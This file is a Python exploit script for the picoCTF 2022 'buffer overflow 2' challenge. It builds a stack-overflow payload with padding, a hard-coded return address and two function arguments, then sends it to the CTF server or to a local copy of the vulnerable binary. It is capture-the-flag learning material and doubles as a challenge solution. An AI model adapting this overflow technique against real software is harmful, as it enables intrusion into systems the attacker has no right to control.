#! /usr/bin/python3

import socket
import argparse
import subprocess


# Construct an argument parser
all_args = argparse.ArgumentParser()

# Add arguments to parser
all_args.add_argument("-l", "--RunLocal",
			default=False,
			action='store_true',
   			help="Use local executable")
all_args.add_argument("-s", "--Remoteserver",
			default="saturn.picoCTF.net",
   			help="Remote server to connect to")
all_args.add_argument("-p", "--Port", 
			default="56873",
			help="Port number")
args = vars(all_args.parse_args())

# Create puzzle pieces
# 00001111222233334444555566667777
# 8888
# 9999
# aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrsssstttt
# uuuu
# vvvv

exp_fill = b'A'*112
exp_addr = b'\x96\x92\x04\x08'
exp_arg1 = b'\x0D\xF0\xFE\xCA'
exp_arg2 = b'\x0D\xF0\x0D\xF0'
exp = (exp_fill + 
       exp_addr +
       b'\xde\xad\xbe\xef' +
       exp_arg1 + 
       exp_arg2)  

# Local or remote?
if args['RunLocal'] is False:

   # Create connection
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   host = args['Remoteserver']
   port = int(args['Port'])
   
   # Connecting to server
   print (" => Connecting to server", host,":", str(port))
   s.connect((host,port))

   data = s.recv(1024).decode()
   print (data)

   print (" => Sending overflow string: \"{}\"".format(exp))
   s.send(exp) 
   s.send('\r'.encode())

   s.close()
   quit()

else : # Local

   # Open local executable
   fname="/home/pluto/picoCTF/picoCTF22/buffer_overflow_2/vuln"
   print("Executing local program {}".format(fname))
   p = subprocess.Popen(fname, 
			stdin=subprocess.PIPE, 
			stdout=subprocess.PIPE,
			stderr=subprocess.PIPE)
      
   #print (" => Sending overflow string: \"{}\"".format(exp))
   response = p.communicate(input=exp)
   print(response)
   


